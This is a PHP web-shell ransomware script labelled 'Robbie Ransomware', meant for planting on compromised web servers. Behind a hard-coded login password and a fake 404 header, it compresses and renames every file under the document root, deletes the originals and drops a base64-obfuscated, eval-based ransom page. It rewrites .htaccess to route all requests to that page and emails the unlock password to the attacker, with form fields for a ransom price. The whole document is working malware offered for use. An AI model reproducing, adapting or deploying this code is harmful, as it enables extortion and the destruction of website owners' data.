<?php
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "lombokkeras";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location=''</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location=''</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<meta name="theme color" content="black"> </meta>
<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">
<html>
<head>
	<title>Login</title>
</head>
<body bgcolor="black">
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }

  body {

    background-size: cover;
    background-attachment: fixed;
    background-position: 0 -100px;
  }

</style>
  <body>
  <br><br>
	<center><center><br><br><font color="lime" face="Courier New" size="3">| Robbie Ransomware |</font><br><br></center>

    
	  <form method="post">
		  <input type="password" name="password" placeholder="Password">
      <input type="submit" value="login">
		  <br>
		  <br>
		<?php echo $_SESSIOM['forbidden']; ?>
	  </form>
	  </td>
	 </table>
<?php 

exit();
}
?>
<title>Ransomware</title>
<link rel="shortcut icon" type="image/x-icon" http://gurmatparcharsewasociety.org//FB_IMG_15630140776231295.jpg?_nc_cat=103&_nc_ht=scontent.fcgk18-1.fna&oh=2da74a0c2522bc1be821eaf4c88d597b&oe=5D84016D">
<style>
html {
background: black;
color: white;
}
input { background: transparent; color: lime; border: 1px solid lime; }
</style>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
    if (strpos($filename, '.crypt') !== false) {
    return;
    }
    file_put_contents($filename.".crypt", gzdeflate(file_get_contents($filename), 9));
    unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPkVuY3J5cHRlZDwvdGl0bGU+CjxzdHlsZT4KaHRtbCB7CmJhY2tncm91bmQ6IGJsYWNrOwpjb2xvcjogd2hpdGU7Cn0KaW5wdXQgeyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgY29sb3I6IGdyZXk7IGJvcmRlcjogMXB4IHNvbGlkIGdyZWVuOyB9Cgo8L3N0eWxlPgoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokaW5wdXQgPSAkX1BPU1RbJ3Bhc3MnXTsKJHBhc3MgPSAiamFuY29ramFyYW4iOwppZihpc3NldCgkaW5wdXQpKSB7CmlmKG1kNSgkaW5wdXQpID09ICRwYXNzKSB7CmZ1bmN0aW9uIGRlY2ZpbGUoJGZpbGVuYW1lKXsKCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLmNyeXB0JykgPT09IEZBTFNFKSB7CglyZXR1cm47Cgl9CgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOwoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5jcnlwdCcsICcnLCAkZmlsZW5hbWUpLCAkZGVjcnlwdGVkKTsKCXVubGluaygnY3J5cHQucGhwJyk7Cgl1bmxpbmsoJy5odGFjY2VzcycpOwoJdW5saW5rKCRmaWxlbmFtZSk7CgllY2hvICIkZmlsZW5hbWUgRGVjcnlwdGVkICEhITxicj4iOwp9CgpmdW5jdGlvbiBkZWNkaXIoJGRpcil7CgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOwoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7CgkJCWlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpewoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsKCQkJfWVsc2UgewoJCQkJZGVjZmlsZSgkZGlyLiIvIi4kZmlsZSk7CgkJfQoJfQp9CgpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7CmVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOwp1bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOwp1bmxpbmsoJy5odGFjY2VzcycpOwpjb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsKZWNobyAnU3VjY2VzcyAhISEnOwp9IGVsc2UgewplY2hvICdGYWlsZWQgUGFzc3dvcmQgISEhJzsKfQpleGl0KCk7Cn0KPz4KCjxicj4KPC9zdHlsZT4KPC9kaXY+Cjwvc2NyaXB0Pgo8YnI+Cgo8Zm9udCBmYWNlPSJDb3VyaWVyIE5ldyIgc2l6ZT0iMyIgY29sb3I9ImdyZWVuIj48YnI+PGJyPjxicj48YnI+WW91ciB3ZWJzaXRlIGlzIEVuY3J5cHRlZCBieSBLaWVibwoKPGJyPjxicj4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJkZWNyeXB0Ij4KPC9mb3JtPgoK");
$q = str_replace('jancokjaran', md5($_POST['pass']), $file);
$w = str_replace('gufronadiwijoyo@gmail.com', $_POST['email'], $q);
$e = str_replace('kontolanjing', $_POST['btc'], $w);
$r = str_replace('$100', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Done!<br>";
}
function encdir($dir){
    $files = array_diff(scandir($dir), array('.', '..'));
        foreach($files as $file) {
            if(is_dir($dir."/".$file)){
                encdir($dir."/".$file);
            } else {
                encfile($dir."/".$file);
               
        }
    }
}
if(isset($_POST['pass'])){
    encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<font face="Courier New" color="lime"><br>| Robbie Ransomware |<br><br></h1>
<br>
Path File : <font color="lime"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br><br>
<form enctype="multipart/form-data" method="post">
Sandi: <input type="text" name="pass"><br><br>
Email: <input type="text" name="email"><br><br>
Harga: <input type="text" name="price">
<br><br>
<input type="submit" value="encrypt"><br><br><br><br><br>


</form>